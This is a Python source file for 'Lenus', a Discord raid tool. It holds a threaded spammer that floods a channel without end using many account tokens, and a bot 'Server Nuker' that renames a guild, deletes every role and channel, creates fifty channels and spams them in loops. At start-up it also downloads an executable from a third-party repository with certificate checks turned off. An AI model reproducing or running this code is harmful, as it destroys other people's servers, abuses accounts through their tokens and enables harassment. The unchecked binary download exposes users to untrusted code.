from utilities.Settings.common import *
from utilities.Settings.libarys import *
from utilities.Settings.update import search_for_updates


w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
# r = Fore.RESET

#########################################################

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.1)

global cls
def cls():
 os.system('cls' if os.name=='nt' else 'clear')

def tool():
  os.system('cls' if os.name=='nt' else 'clear')

def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')

global useragent
def useragent():
    file = open('data/useragent.txt','r')
    useragent = (random.choice(list(file)))
    useragent2 = []
    useragent2.append(useragent)
    useragent1 = []

#########################################################

try:
    with open('data/logins.json') as f:
        config = json.load(f)
except:
    with open('data/logins.json', 'w') as f:
            print(f"Registation System")
            login = input("\x1b[32m$\x1b[37m Enter A Username: ")
            json.dump({"Login": login}, f, indent=4)
    input(f"Press ENTER to Continue: ")
    pass
with open('data/logins.json') as f:
    config = json.load(f)
login = config.get('Login')

def x():
    import datetime
    channel7 = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ")
    mess7 = input("[\x1b[95m>\x1b[95m\x1B[37m] Message: ")
    tokens = open("tokens.txt", "r").read().splitlines()
    def spam(token, channel7, mess7):
        url = 'https://discord.com/api/v9/channels/'+channel7+'/messages'
        data = {"content": mess7}
        header = {"authorization": token}
        while True:
            nowxy= datetime.datetime.now()
            r = requests.post(url, data=data, headers=header)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[Successfully Sent From]: {Fore.WHITE}{token[:63]}*********")
            else:
                print(f"{Fore.LIGHTRED_EX}[Failed To Send By]: {Fore.WHITE}{token[:63]}*********")
    for token in tokens:
        while True:
            threads = []
            for token in tokens:
                thread = threading.Thread(target=spam, args=(token,channel7,mess7))
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()

languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'aud'   : 'English, Austrlia',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

regions = [
    'brazil',
    'hongkong',
    'india',
    'japan',
    'rotterdam',
    'russia',
    'singapore',
    'southafrica',
    'sydney',
    'us-central',
    'us-east',
    'us-south',
    'us-west'
]


def spammer():
    global threads
    setTitle(f"")
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    clear = lambda: os.system('cls')
    clear()

    colorama.init()
    Write.Print(f'Welcome To Lenus', Colors.red,  interval=0.000)
    print('')
    print('')
    Write.Print("                        $$$$\     $$$$$$\   $$\   $$ |$$    $$ |$$$$\ $$\n", Colors.red, interval=0.000)
    Write.Print("                        $$ |      $$  _____|$$$\  $$ |$$ |  $$ |$$  __$$\n", Colors.red, interval=0.000)
    Write.Print("                        $$ |      $$ |      $$$$\ $$ |$$ |  $$ |$$ /  \__|\n", Colors.red, interval=0.000)
    Write.Print("                        $$ |      $$$$$\    $$ $$\$$ |$$ |  $$ |\$$$$$$\ \n", Colors.red, interval=0.000)
    Write.Print("                        $$ |      $$  __|   $$ \$$$$ |$$ |  $$ | \____$$\ \n", Colors.red, interval=0.000)
    Write.Print(f'                        $$ |      $$ |      $$ |\$$$ |$$ |  $$ |$$\   $$ | \n', Colors.red, interval=0.000)
    Write.Print(f' > [v{0.1}]               $$$$$$$$\ $$$$$$$$\ $$ | \$$ |\$$$$$$  |\$$$$$$  |\n', Colors.red, interval=0.000)
    Write.Print("                        \________|\________|\__|  \__| \______/  \______/ \n", Colors.red, interval=0.000)
    Write.Print("———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————", Colors.dark_red, interval=0.000)
    print(f'''{m}'''.replace('$', f'{m}${w}') + f'''
 {y}1 {w}Server Nuker''')
    Write.Print("————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————", Colors.dark_red, interval=0.000)
    choice = input(f'Select Tool: ')



  #   SERVER NUKER
    if choice == '1':
        Spinner()
        setTitle(f"Server Nuker   |    ")
#       intents = discord.Client(intents=discord.Intents().all())
#       width = os.get_terminal_size().columns
        def menu():
                token = input(f"\x1b[32m$\x1b[37m Enter Your Bot Token: ")
                f = open("utilities/stuff/ignore/.token", "w")
                f.write(token)
                f.close()

                prefix = input(f"\x1b[32m$\x1b[37m Enter Your Bot Perfix: ")
                f = open("utilities/stuff/ignore/.prefix", "w")
                f.write(prefix)
                f.close()

                spammessage = input(f"\x1b[32m$\x1b[37m Spam Message: ")
                f = open("utilities/stuff/ignore/.message", "w")
                f.write(spammessage)
                f.close()

                channelsname = input(f"\x1b[32m$\x1b[37m Channel Name: ")
                f = open("utilities/stuff/ignore/.channelsname", "w")
                channelsname = channelsname.lower()
                channelsname.replace("", "-")
                f.write(channelsname)
                f.close()
                main()

        def main():
    
            prefix = open("utilities/stuff/ignore/.prefix", "r")
            prefix = prefix.read()

            token = open("utilities/stuff/ignore/.token", "r")
            token = token.read()

            channelsname = open("utilities/stuff/ignore/.channelsname", "r")
            channelsname = channelsname.read()

            spammessage = open("utilities/stuff/ignore/.message", "r")
            spammessage = spammessage.read()

            linus = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
            linus.remove_command('help')

            @linus.event
            async def on_ready():
                if len(linus.guilds) > 1:
                    guildpl = "guilds"
                else:
                    guildpl = "guild"
                activity = discord.Game(name=f"Lenus Server Nuker", type=3)
                await linus.change_presence(status=discord.Status.dnd, activity=activity)
                clear()
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot : {linus.user} ({len(linus.guilds)} {guildpl})")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Prefix : {prefix}")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Spam message : {spammessage}")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Channels name : {channelsname}")
                print(f"")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] type: {prefix}nuke in a channel")
                print(f"")

            @linus.event
            async def on_guild_channel_create(channel):
                while True:
                    await channel.send(spammessage)
                    print(f"{m}${w} Sent : {spammessage}")

            @linus.event
            async def on_guild_join(guild):
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite()
                        break
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Joined Guild : {guild.name} ({guild.id}) {invite}")

            @linus.command()
            async def nuke(ctx):
                await ctx.message.delete()
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Nuking {ctx.guild.name} ({ctx.guild.id})...")
                await ctx.guild.edit(name="Lenus Runs Discord")
                for role in ctx.guild.roles:
                    try:
                        await role.delete()
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: @{role.name}")
                    except:
                        pass
                        print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: @{role.name}")

                for channel in ctx.guild.channels:
                    try:
                        await channel.delete()
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: #{channel.name}")
                    except:
                        pass
                        print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: #{channel.name}")
                try:
                    for i in range(50):
                        await ctx.guild.create_text_channel(channelsname)
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created: #{channel.name}")
                except Exception as er:
                    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error: {er}")
            try:
                linus.run(token)
            except Exception as er:
                pass
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")
                input()

        while True:
            menu()




#   EXIT
    if choice == '00':
        Spinner()
        exit = True if input(f"\n[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Are You Sure You Want To Exit Lenus? Y/N: ").lower() == "y" else spammer() or "n" == sys.exit(0)
    else:
        print(f"")
        time.sleep(0)
        return spammer()
    

    #   AUTO DOWNLOAD DRIVERS
if __name__ == "__main__":
                import sys
                setTitle(f"Dowloading Drivers    |    ")
                os.system("""if not exist "./chromedriver.exe" echo [+] Downloading Drivers: """)
                os.system("""if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://github.com/TT-Tutorials/addons/raw/main/chromedriver.exe" """)
                if os.path.basename(sys.argv[0]).endswith("exe"):
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\gang_proxies"):
                       clear()
                else:
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\gang_proxies"):
                        clear()
spammer()
